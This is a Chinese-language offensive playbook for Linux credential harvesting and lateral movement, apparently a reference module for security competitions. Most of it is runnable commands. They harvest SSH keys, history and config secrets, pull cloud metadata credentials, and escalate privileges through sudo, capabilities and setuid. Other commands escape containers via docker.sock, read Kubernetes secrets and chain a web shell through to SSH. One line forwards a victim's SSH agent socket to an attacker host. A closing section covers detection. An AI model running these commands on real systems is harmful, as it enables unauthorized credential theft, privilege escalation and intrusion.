# Linux 凭据横移：artifact 清单、可接受点、容器到宿主

> 被 `competition-linux-credential-pivot` 引用。核心纪律：**「找到密钥」不是结论，「密钥在哪个服务被接受」才是**。
> Linux 的凭据来源比 Windows 分散得多（文件、环境变量、socket、metadata），
> 所以清单要按「存放位置 → 属主/scope → 接受点」三列组织，不能只列路径。

## 一、artifact 清单（按命中率排序）

| 类别 | 路径/位置 | 属主与 scope | 接受点 |
| --- | --- | --- | --- |
| **SSH 私钥** | `~/.ssh/id_rsa`、`id_ed25519`、`~/.ssh/config` 里的 `IdentityFile` | 用户 | `ssh user@host`、git over SSH |
| **SSH agent socket** | `$SSH_AUTH_SOCK`（`/tmp/ssh-XXXX/agent.PID`） | 用户，**生命周期 = 登录会话** | `ssh-add -l` 列出，`ssh` 自动使用 |
| **authorized_keys** | `~/.ssh/authorized_keys` | 用户（说明**谁能进来**） | 反向：找到可写入的目标 → 加自己的 key |
| **known_hosts** | `~/.ssh/known_hosts` | 用户 | **拓扑情报**（哪些主机被访问过），不是凭据 |
| **.bash_history / .zsh_history** | 用户家目录 | 用户 | 常有 `ssh user@host`、`mysql -p...`、`curl -H "Authorization: Bearer ..."` |
| **云 metadata token** | `http://169.254.169.254/metadata/identity/oauth2/token`（Azure）、`http://169.254.169.254/latest/meta-data/iam/security-credentials/`（AWS） | 实例角色 | 云 API（IMDSv1 直接拿，IMDSv2 需先 PUT 拿 token） |
| **kubeconfig** | `~/.kube/config`、`/etc/kubernetes/admin.conf`、`/var/lib/kubelet/kubeconfig` | 用户 / 节点 | `kubectl --kubeconfig=...`，API server |
| **service account token** | `/var/run/secrets/kubernetes.io/serviceaccount/token`（Pod 内） | Pod 的 SA | K8s API（含 CA 与 namespace） |
| **docker config** | `~/.docker/config.json`（`auths` 里 base64 的 user:pass） | 用户 | 镜像仓库 |
| **systemd 单元环境变量** | `/etc/systemd/system/*.service` 的 `Environment=` / `EnvironmentFile=` | root（但常 644） | 该服务使用的下游系统 |
| **cron 脚本里的口令** | `/etc/crontab`、`/var/spool/cron/crontabs/*`、`/etc/cron.d/*` | root / 用户 | 脚本里 `mysql -u... -p...`、`curl` 带 token |
| **应用配置文件** | `/var/www/**/.env`、`wp-config.php`、`config/database.yml`、`/etc/mysql/debian.cnf` | www-data / root | DB、第三方 API |
| **git 凭据** | `~/.git-credentials`（明文 URL 带密码）、`~/.gitconfig` 的 `[credential]` | 用户 | git 远端 |
| **netrc** | `~/.netrc`（`machine host login user password pass`） | 用户 | ftp/curl |
| **pgpass / my.cnf** | `~/.pgpass`、`~/.my.cnf`、`/root/.my.cnf` | 用户 | PostgreSQL / MySQL |
| **AWS/GCP CLI 配置** | `~/.aws/credentials`、`~/.config/gcloud/credentials.db` | 用户 | 云 API |
| **VNC 密码** | `~/.vnc/passwd`（DES 加密，可逆） | 用户 | VNC 服务 |
| **Wi-Fi/其他** | `/etc/NetworkManager/system-connections/*.nmconnection` | root（600） | 网络 |
| **shadow** | `/etc/shadow`（root 可读） | root | 本地 `su`/`ssh` 密码登录 |
| **sudoers** | `/etc/sudoers`、`/etc/sudoers.d/*` | root | `sudo`（见第四节） |
| **LSA 类（Linux 侧）** | `~/.local/share/keyrings/*.keyring`（GNOME Keyring） | 用户 | 应用密码（需 keyring 密码） |

### 采集命令（一次性扫完，注意不要触发告警）

```bash
# 快速清单（不改文件、不执行）
find / -xdev \( -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.key" \) \
  -type f 2>/dev/null | head -100

# 有内容的私钥（过滤掉空壳与公钥）
find / -xdev -name "id_*" -type f ! -name "*.pub" 2>/dev/null |
  xargs -I{} sh -c 'grep -q "PRIVATE KEY" "{}" 2>/dev/null && echo "{}"'

# 配置类凭据的关键词扫描（低噪声，grep 不落盘）
grep -rIl -E "(password|passwd|secret|token|api[_-]?key)\s*[:=]" \
  /var/www /etc /opt /home 2>/dev/null | head -50

# history 里的横向线索
grep -hE "^(ssh|scp|rsync|mysql|psql|redis-cli|curl|wget|kubectl)" \
  /root/.bash_history /home/*/.bash_history 2>/dev/null | sort -u

# SSH 拓扑（谁连过谁）
awk '{print $1}' /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null | \
  tr ',' '\n' | sort -u
```

### SSH agent 的利用（最容易被忽略的一条）

```bash
# 看 agent 里有什么（不需要私钥文件）
echo $SSH_AUTH_SOCK
ssh-add -l
# 输出：2048 SHA256:xxxx /home/alice/.ssh/id_rsa (RSA)

# 直接用 agent 里的 key 连（私钥从未落盘）
ssh -A alice@10.0.0.40
ssh -o "IdentitiesOnly=no" root@10.0.0.41

# 把 agent socket 转发到自己的机器（横向神器）
ssh -R /tmp/evil.sock:$SSH_AUTH_SOCK user@myhost
# 在 myhost 上：SSH_AUTH_SOCK=/tmp/evil.sock ssh-add -l
```

**判据**：`ssh-add -l` 有输出 = agent 里有可用 key；此时**不需要读私钥文件**，
`ssh` 会自动用它。这也是「为什么没找到私钥文件却登上了」的常见原因。

## 二、云 metadata：最容易被漏掉的高价值目标

### AWS（IMDSv1 vs IMDSv2）

```bash
# IMDSv1（只需 GET）
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
# 返回 AccessKeyId / SecretAccessKey / Token

# IMDSv2（必须先拿 token）
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 用临时凭据验证（这是验伤的关键一步）
AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... \
  aws sts get-caller-identity
```

**验伤**：`aws sts get-caller-identity` 返回 `Arn` 才是真的；仅看到 credentials JSON 不算
（可能是过期缓存或错误角色）。

### Azure / GCP

```bash
# Azure IMDS
curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# 返回 access_token；用它调 ARM 验证
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# GCP
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**判据**：IMDS 在**容器里通常也能访问**（除非网络策略禁了 `169.254.169.254`）——
这是从容器跳到云控制面的常见路。检查 `curl -m 3` 是否超时即可判断。

## 三、systemd / cron 里的凭据（常 644，普通用户可读）

```bash
# 所有 unit 里的环境变量
systemctl list-units --type=service --all --no-pager
grep -rhE "^(Environment|EnvironmentFile)=" /etc/systemd/system/ 2>/dev/null

# 直接读某个 unit 的完整配置（含 drop-in）
systemctl cat backup.service

# 进程实际环境（最可靠，能看到 EnvironmentFile 展开后的值）
tr '\0' '\n' < /proc/$(pgrep -f backup.service | head -1)/environ | grep -iE "pass|token|key"

# cron 里的口令
cat /etc/crontab /etc/cron.d/* 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null
```

**注意**：`/proc/<pid>/environ` 读别人的进程需要 **同 UID 或 root**。这是最常见的「读不到」原因。

**典型产出**：备份脚本里的 `PGPASSWORD=`、`MYSQL_PWD=`、`AWS_*`、`RESTIC_PASSWORD=`，
以及 `curl -H "Authorization: Bearer ..."`。

## 四、sudo 配置缺陷（本机提权的第一条路）

```bash
# 看自己能 sudo 什么
sudo -l
# 典型危险行：
#   (root) NOPASSWD: /usr/bin/vim
#   (root) NOPASSWD: /usr/bin/find
#   (ALL) NOPASSWD: ALL
#   (root) NOPASSWD: /usr/bin/systemctl restart *

# 版本漏洞（不影响 sudoers 也能提权）
sudo --version    # < 1.8.28 有 CVE-2019-14287（-u#-1 绕过）
```

常见可利用模式：

| sudoers 行 | 利用 |
| --- | --- |
| `NOPASSWD: /usr/bin/vim` | `sudo vim -c ':!/bin/sh'` |
| `NOPASSWD: /usr/bin/find` | `sudo find / -exec /bin/sh \; -quit` |
| `NOPASSWD: /usr/bin/less` | `sudo less /etc/hosts` 然后 `!sh` |
| `NOPASSWD: /usr/bin/systemctl` | 写一个 unit 到 `/etc/systemd/system/` 再 `sudo systemctl start` |
| `NOPASSWD: /usr/bin/docker` | `sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| `NOPASSWD: /usr/bin/apt` | `sudo apt-get install -o APT::Update::Pre-Invoke::=/bin/sh` |
| `(ALL) ALL`（需密码） | 若知道密码 → 直接 `sudo -i` |
| `SETENV:` 允许设环境变量 | 配合 `LD_PRELOAD`（需 `env_keep` 含 `LD_PRELOAD`） |

```bash
# 落地的三条最常用
sudo vim -c ':!/bin/sh' -c ':q!' /etc/hosts
sudo find / -exec /bin/sh \; -quit
sudo systemctl status $(printf 'x;\n/bin/sh') 2>/dev/null
```

**验伤**：`sudo -i` 后 `id` 输出 `uid=0(root)`。反例：`sudo -l` 显示有权限但执行报
`sudo: sorry, you must have a tty to run sudo` → 需要 `-S` 或用 `script -qc` 包一层。

### capabilities 与 setuid（sudo 之外的两条）

```bash
# 有 cap 的二进制（比 setuid 隐蔽，审计常漏）
getcap -r / 2>/dev/null
# cap_setuid+ep 的例子：python3、perl
# 利用：cap_setuid 的 python
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# setuid（老但有效）
find / -xdev -perm -4000 -type f 2>/dev/null
```

| capability | 可直接提权 |
| --- | --- |
| `cap_setuid+ep` | 是（`setuid(0)`） |
| `cap_setgid+ep` | 是（配合组权） |
| `cap_dac_read_search+ep` | 是（读 `/etc/shadow`） |
| `cap_dac_override+ep` | 是（写任意文件，如 `/etc/passwd`） |
| `cap_sys_admin+ep` | 是（mount、改 cgroup） |
| `cap_sys_ptrace+ep` | 是（注入 root 进程） |

## 五、容器 → 宿主的凭据来源

从容器里往宿主走，凭据来源与普通主机不同，集中在四处：

| 来源 | 位置 | 能拿到什么 |
| --- | --- | --- |
| **挂载的 docker socket** | `/var/run/docker.sock` | **直接等于宿主 root**（能起特权容器） |
| **containerd socket** | `/run/containerd/containerd.sock` | 同上（`ctr -n k8s.io`） |
| **挂载的宿主目录** | `/host`、`/mnt`、`/var/lib/docker` | 宿主 `/etc/shadow`、SSH key、云凭据 |
| **`/proc` 可见宿主进程** | `--pid=host` 或 `CAP_SYS_PTRACE` | 读宿主进程 `environ`（含凭据） |
| **K8s SA token** | `/var/run/secrets/kubernetes.io/serviceaccount/token` | API server（可能能读 Secret） |
| **云 metadata** | `169.254.169.254` | 节点实例角色的云凭据 |
| **cgroup 路径** | `/proc/1/cgroup`、`/proc/self/mountinfo` | 判断是否在容器、是 docker 还是 k8s |

```bash
# 是否在容器
cat /proc/1/cgroup | head
ls -la /.dockerenv 2>/dev/null

# docker socket 可用？
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock ps
# 可用则直接：起一个挂宿主根的容器
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh

# 读宿主进程环境（需 CAP_SYS_PTRACE 或 pid=host）
for p in /proc/[0-9]*; do
  tr '\0' '\n' < $p/environ 2>/dev/null | grep -iE "pass|token|secret" && echo "<- $p"
done

# K8s SA token 能做什么
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

**验伤**：
- docker socket：`docker ps` 能列出**宿主**容器（不是自己的）。
- SA token：`kubectl auth can-i --list` 有非 `get pods` 之外的能力，或能读 Secret 的 `data`。
- 宿主进程 environ：读到的是**宿主 PID**（`/proc/1` 的 cgroup 路径含 `docker-<id>.scope` 或 `kubepods`）。

## 六、重放矩阵：artifact → 接受点 → 命令

| artifact | 接受点 | 命令 | 验伤 |
| --- | --- | --- | --- |
| SSH 私钥 | sshd（22） | `ssh -i key -o IdentitiesOnly=yes user@10.0.0.40` | 拿到 shell（`id` 输出目标用户） |
| SSH agent | sshd | `SSH_AUTH_SOCK=/tmp/a ssh user@host` | 同上 |
| kubeconfig | API server（6443） | `kubectl --kubeconfig=cfg get nodes` | 返回节点列表 |
| SA token | API server | `curl -H "Authorization: Bearer $T" .../pods` | 返回 JSON `items` |
| 云临时凭据 | 云 API | `aws sts get-caller-identity` | 返回 `Arn` |
| DB 口令 | MySQL/Postgres | `mysql -h 10.0.0.50 -u app -p'P@ss' -e 'select user()'` | 返回用户名 |
| `.git-credentials` | git HTTPS | `git clone https://user:pass@git.internal/repo.git` | 克隆成功 |
| 应用 `.env` 里的 token | 第三方 API | `curl -H "Authorization: Bearer $T" https://api.../me` | 返回账号信息 |
| VNC 密码 | VNC（5900） | `vncviewer -passwd <file> 10.0.0.60` | 看到桌面 |
| sudo 缺陷 | 本机 | `sudo -i` | `id` = root |
| cap_setuid | 本机 | `python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'` | `id` = root |
| docker.sock | 宿主 | `docker run -v /:/h --rm -it alpine chroot /h sh` | 看到宿主 `/etc/shadow` |

### 一条完整的最小链（示例：从 web 用户到 DB 与下一台机器）

```bash
# 起点：www-data（webshell 或 RCE），先确认自己在哪
id; hostname; cat /proc/1/cgroup | head -2

# 1) 从应用配置拿 DB 口令（最高命中率的位置）
grep -riE "DB_(PASS|PASSWORD)|password" /var/www/html/.env /var/www/html/wp-config.php 2>/dev/null

# 2) 验证 DB 口令被接受（这一步才算 artifact 变凭据）
mysql -h 10.0.0.50 -u app_ro -p'<PASS>' -e 'select user(),database(); show databases;'
#   验伤：返回 user() 与库列表；只连上但 show databases 报权限错 → 权限受限，记下来别夸大

# 3) 从 DB 里挖下一步（用户表常直接有明文或可复用口令）
mysql -h 10.0.0.50 -u app_ro -p'<PASS>' -D appdb -e \
  "select user,authentication_string from mysql.user;" 2>/dev/null

# 4) 从 web 用户的历史/配置找 SSH 路径
cat /var/www/.bash_history 2>/dev/null | grep -E "^(ssh|scp|git clone)"
ls -la /var/www/.ssh 2>/dev/null

# 5) 若有私钥，验证它被目标 sshd 接受（-o BatchMode 避免卡在口令提示）
chmod 600 /tmp/k && ssh -i /tmp/k -o BatchMode=yes -o StrictHostKeyChecking=no \
  deploy@10.0.0.40 'id; hostname'
#   验伤：回显 id 且 uid 是 deploy；报 Permission denied (publickey) 说明 key 不匹配这台

# 6) 到新主机后先看 sudo 与 cap（本机提权的两条主路）
sudo -l 2>/dev/null; getcap -r / 2>/dev/null | head
```

**这条链的四个「必须证明」点**（缺任何一个，报告就只能写「疑似」）：
① DB 口令执行了 `select user()`；② SSH key 拿到了 `id` 回显；
③ 新主机上 `sudo -l` 的结果；④ root 后能读到的东西（`/etc/shadow` 首行）。

## 七、检测视角

| 动作 | 日志 | 信号 |
| --- | --- | --- |
| 枚举私钥 | auditd `-w /home -p r` 或 EDR | 单进程批量 `open/read` 多个 `.ssh/` 下文件 |
| `ssh-add -l` | auditd `execve` | `ssh-add` 带 `-l`（枚举）或 `-L`（导出公钥） |
| 读 `/proc/*/environ` | auditd 或 `bpftrace` | 跨 UID 读 environ（正常进程只读自己的） |
| 批量 grep 凭据 | 无（这是最大盲区） | 只能靠 `execve` 里 `grep -r ... password`；或文件读取量异常 |
| 云 metadata 访问 | VPC Flow Log / 云审计（CloudTrail `GetInstanceMetadata`） | 从非常规进程访问 `169.254.169.254`；IMDSv2 token 请求 |
| `aws sts get-caller-identity` | CloudTrail | 实例角色凭据被用于 `sts:GetCallerIdentity`（这是**验证**动作，很显眼） |
| sudo 提权 | `/var/log/auth.log` / journald | `sudo: alice : TTY=... ; COMMAND=/bin/sh`；`NOPASSWD` 的异常命令 |
| cap 提权 | auditd `execve` | 带 cap 的二进制被执行（`python3` 带 `cap_setuid`） |
| docker.sock 使用 | docker daemon 日志 / auditd | `POST /containers/create` 带 `Binds: ["/:/h"]`、`Privileged: true` |
| SA token 滥用 | K8s audit log | SA 在非预期 namespace 读 `secrets`；`user.username=system:serviceaccount:...` |
| 容器逃逸（挂宿主） | 宿主 auditd | 容器内进程 `chroot` 到宿主、或 `mount` 宿主块设备 |

**响度**：
- `aws sts get-caller-identity` —— **极高**（CloudTrail 必记，且 `GetCallerIdentity` 本身就是显眼 API）；
- `kubectl get secrets` —— **高**（K8s audit 默认记录）；
- `grep -r` 扫凭据 —— **低**（只在 `execve` 留一条，很多环境不记录全量 execve）；
- 读 `/proc/*/environ` —— **中**（需要 auditd 规则，否则无痕）。

## 八、常见坑

1. **只找私钥文件，忽略 agent**。私钥可能被 passphrase 保护（`ssh` 要求输入），
   但 agent 里的是**已解锁的**，`ssh` 直接用，不需要口令。先 `ssh-add -l`。
2. **私钥权限太松被 sshd 拒**。`ssh -i key` 报 `UNPROTECTED PRIVATE KEY FILE` 时 `chmod 600 key`。
3. **known_hosts 当凭据**。它只是主机公钥，价值是**拓扑**（哪些 IP 被访问过），不能用来登录。
4. **`/proc/<pid>/environ` 读不到**。跨 UID 必须 root；`ps eww` 也受同样限制。
5. **`sudo -l` 显示有权限但执行失败**。`requiretty`、`secure_path`、或命令路径用的是相对路径（`sudo vim` 与 `sudo /usr/bin/vim` 规则不同）。
6. **IMDSv2 环境用 IMDSv1 请求**。`curl` 返回 401 → 必须先 `PUT /latest/api/token`。
7. **云凭据不验就写报告**。临时凭据有有效期（通常 1 小时），stale 的 JSON 看起来一样但用不了；
   必须 `sts get-caller-identity` 验证。
8. **容器里以为 docker.sock 一定在**。先 `ls -la /var/run/docker.sock`；很多运行时用 containerd 或 podman，路径不同。
9. **K8s SA token 权限默认极小**。默认 SA 只有 `get pods` 之类；能读 Secret 需要额外 RBAC。
   先 `kubectl auth can-i --list` 再决定。
10. **history 被清空**。`HISTFILE=/dev/null`、或 `unset HISTFILE` 的会话不留痕；
    改看 `/var/log/secure`（登录来源）、`~/.ssh/known_hosts`（去过的目标）、进程残留命令行（`/proc/*/cmdline`）。